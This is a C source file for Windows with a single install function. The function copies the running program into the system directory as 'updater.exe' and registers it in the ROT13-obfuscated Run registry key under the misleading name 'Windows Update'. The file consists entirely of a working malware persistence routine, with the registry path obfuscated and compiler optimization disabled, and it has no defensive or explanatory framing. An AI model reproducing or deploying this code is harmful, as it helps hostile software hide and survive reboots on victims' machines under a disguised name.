#include "data_globals.h"
#include <windows.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _Install(void)
{
    char ModPath[256];
    char SPath[256];
    char TranGU[110];
    volatile DWORD cbData_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_cbData = (volatile DWORD *)&cbData_buf[0];
    volatile HKEY hKey_buf[2] = {{NULL, (HKEY)0}};
    volatile HKEY *p_hKey = (volatile HKEY *)&hKey_buf[0];

    GetModuleFileNameA(NULL, ModPath, sizeof(ModPath));
    GetSystemDirectoryA(SPath, sizeof(SPath));
    strcat(SPath, "\\updater.exe");
    CopyFileA(ModPath, SPath, FALSE);

    memset(TranGU, 0, sizeof(TranGU));
    _CiphStr(TranGU, "FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha");

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, TranGU, 0, KEY_WRITE, (HKEY*)p_hKey);
    (*p_cbData) = strlen(SPath);
    RegSetValueExA((*p_hKey), "Windows Update", 0, REG_SZ, SPath, (*p_cbData));
    RegCloseKey((*p_hKey));

    return 0;
}
#pragma optimize("", on)
